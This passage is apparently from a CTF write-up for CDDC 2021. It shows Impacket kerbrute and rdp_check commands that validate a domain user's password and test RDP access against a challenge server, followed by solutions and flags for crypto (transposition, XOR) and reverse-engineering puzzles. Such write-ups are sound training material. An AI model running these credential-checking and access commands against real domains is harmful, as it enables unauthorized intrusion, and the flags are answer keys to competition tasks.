python3 kerbrute.py -user John -password '#johnIStheBEST!' -domain gdc.local -dc-ip 18.136.74.102
Impacket v0.9.24.dev1+20210618.54810.11f43043 - Copyright 2021 SecureAuth Corporation

[*] Stupendous => John:#johnIStheBEST!
[*] Saved TGT in John.ccache

python3 rdp_check.py gdc/John:'#johnIStheBEST!'@18.136.74.102
Impacket v0.9.24.dev1+20210618.54810.11f43043 - Copyright 2021 SecureAuth Corporation

[*] Access Granted
```

```bash
rdesktop -u John -d GDC.LOCAL 18.136.74.102
Core(warning): Certificate received from server is NOT trusted by this system, an exception has been added by the user to trust this specific certificate.
Failed to initialize NLA, do you have correct Kerberos TGT initialized ?
Failed to connect, CredSSP required by server (check if server has disabled old TLS versions, if yes use -V option).

xfreerdp /v:18.136.74.102 /u:John
[10:00:33:610] [14630:14631] [ERROR][com.freerdp.core.transport] - BIO_read returned a system error 104: Connection reset by peer
[10:00:33:610] [14630:14631] [ERROR][com.freerdp.core] - transport_read_layer:freerdp_set_last_error_ex ERRCONNECT_CONNECT_TRANSPORT_FAILED [0x0002000D]
[10:00:33:610] [14630:14631] [ERROR][com.freerdp.core] - freerdp_post_connect failed
```

---

# Break It Down (Crypto)

## ~~1. Another Base~~ (unsolved)

200 Points

Our agent stole a file that we believe might contain important data. So far we weren’t able to decrypt it. Please help us

```bash
EdEQyBpcyBub3QgdGhhdCBnb29kIGluIGhpZGluZyB0aGVpciBpbmZvcm1hdGlvbi4uLgoK
UC5TLiBUaGUgZmxhZyBpcyBub3QgaGVyZS4gU29ycnkuLi4K
OJZXG4TBMBGHCMSEORRGCMCQIQYEIRJ2MBQDAOR7GATEIYTONZHAU===
```

## 2. Transatlantic

300 Points

One of our agents intercepted an encrypted message. All we know about it is that it is encrypted using a well-known cypher. Help us decrypt it.

Hint #1: The length of the key is 8.

```bash
# GDC_ENCRYPTED
Gh
Tr!h}DeChisa C D!p_t  bDstn_ ieC_i0h ss230t@  t1nn_r t!{c_td
```

**Courtesy of my teammate, Charmaine:**

![](/static/content/cddc-2021/Untitled%2026.png)

```bash
CDDC21{Th!s_3ncripti0n_!s_n0t_that_h@rd}
```

## 3. Never

300 Points

One of our field agents stole a program that the GDC used to encrypt data and an encrypted file. Help us to decrypt the file. All we know is that it is encrypted using XOR and that the length of the key is 6. We also know the original message contains the word “Never”.

Hint #1: The key only has numbers in it.

```bash
# data
TG\EV^_WVVXG\I^DLG:TG\EV^_WV]TEN_DUV@^;TORBV^WYQCDWQC^DWSP_USUBTCMI^D;wRFTC^X^_PTV[THVBRCH3yUGTCP___PDQHVVXTSHT3yUGTCP___PCU]]X\XTXYTYDKCH^D3=suurKxEny[\nEXEDTUnm__L;
```

[XOR Cipher - Exclusive OR - Online Decoder, Encoder, Solver](https://www.dcode.fr/xor-cipher)

![Since we know that it is an XOR cipher and we also know the length of the key, we can bruteforce the decryption through the online tool](/static/content/cddc-2021/Untitled%2027.png)

Since we know that it is an XOR cipher and we also know the length of the key, we can bruteforce the decryption through the online tool

```bash
CDDC21{It_@ll_$tarted_Th3n}
```

---

# Malicious Puzzle (RE)

## 1. Shifting

The recently captured file server contained a mysterious file that was probably used for getting access to other resources. Can you find the correct password?

Hint #1: The password is generated by the manipulation of some bits.

[file.zip](/static/content/cddc-2021/file%201.zip)

![Digging around in the main method of the executable, we see this suspicious string that suspiciously seems to be the flag considering the occurrence of 1072, 1088 at the front, pointing to CDDC](/static/content/cddc-2021/Untitled%2028.png)

Digging around in the main method of the executable, we see this suspicious string that suspiciously seems to be the flag considering the occurrence of 1072, 1088 at the front, pointing to CDDC

```bash
1072 1088 1088 1072 800 784 1968 848 880 1824 784 1760 864 880 1664 816 768 1824 1936 2000
```

[data.prn](/static/content/cddc-2021/data.prn)

```bash
vim data.tsv
```

![In Excel, we divide the values by 16 and then convert them from ASCII to text, giving us the flag](/static/content/cddc-2021/Untitled%2029.png)

In Excel, we divide the values by 16 and then convert them from ASCII to text, giving us the flag

```bash
CDDC21{57r1n67h30ry}
```
